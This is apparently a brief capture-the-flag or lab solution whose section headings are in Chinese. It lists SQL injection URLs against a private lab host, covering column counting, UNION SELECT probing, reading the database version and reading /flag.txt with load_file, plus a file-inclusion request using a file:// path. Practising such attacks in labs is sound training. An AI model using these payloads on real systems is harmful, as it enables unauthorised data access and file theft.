## 常规漏洞 GET flag

SQL injection
```
http://172.16.2.234:8011/inject.php?id=1' and 1#
http://172.16.2.234:8011/inject.php?id=1 and 1#
http://172.16.2.234:8011/inject.php?id=1 order by 5#
http://172.16.2.234:8011/inject.php?id=1 order by 3#
http://172.16.2.234:8011/inject.php?id=1 order by 4#

http://172.16.2.234:8011/inject.php?id=-1 union select null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,null# 

http://172.16.2.234:8011/inject.php?id=-1 union select null,@@version,null#
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,load_file('/flag.txt')#
```

## 文件包含

```
http://172.16.2.234:8011/include.php?filename=info.txt
http://172.16.2.234:8011/include.php?filename=file:///flag.txt

```
